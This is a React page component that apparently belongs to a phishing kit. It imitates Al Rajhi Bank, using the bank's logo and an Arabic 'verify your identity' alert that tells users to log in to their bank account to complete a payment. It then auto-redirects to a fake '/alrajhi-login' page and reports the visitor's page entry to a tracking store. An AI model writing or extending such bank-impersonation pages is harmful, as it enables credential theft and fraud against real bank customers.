import { useEffect } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import { Button } from "@/components/ui/button";
import { navigateToPage } from "@/lib/store";

export default function AlRajhiAlert() {
  const [, navigate] = useLocation();

  // Emit page enter and auto-navigate
  useEffect(() => {
    navigateToPage("تنبيه الراجحى");
    // Auto navigate after showing alert
    const timer = setTimeout(() => {
      navigate("/alrajhi-login");
    }, 100);
    return () => clearTimeout(timer);
  }, [navigate]);

  return (
    <PageLayout variant="al-rajhi">
      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <img
            src="/images/banks/al-rajhi-banking-and-investment-corp.png"
            alt="الراجحي"
            className="h-16 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">تنبيه</h1>
          <p className="text-gray-500 text-sm">
            يرجى تسجيل الدخول لإتمام العملية
          </p>
        </div>

        {/* Alert Content */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
          <div className="flex items-start gap-3">
            <svg
              className="w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
            <div>
              <h3 className="font-semibold text-yellow-800 mb-1">تحقق من هويتك</h3>
              <p className="text-sm text-yellow-700">
                لإتمام عملية الدفع، يرجى تسجيل الدخول إلى حسابك في مصرف الراجحي للتحقق من هويتك.
              </p>
            </div>
          </div>
        </div>

        {/* Continue Button */}
        <Button
          onClick={() => navigate("/alrajhi-login")}
          className="w-full bg-[#004d7a] hover:bg-[#003d5c]"
          size="lg"
        >
          متابعة
        </Button>
      </div>
    </PageLayout>
  );
}
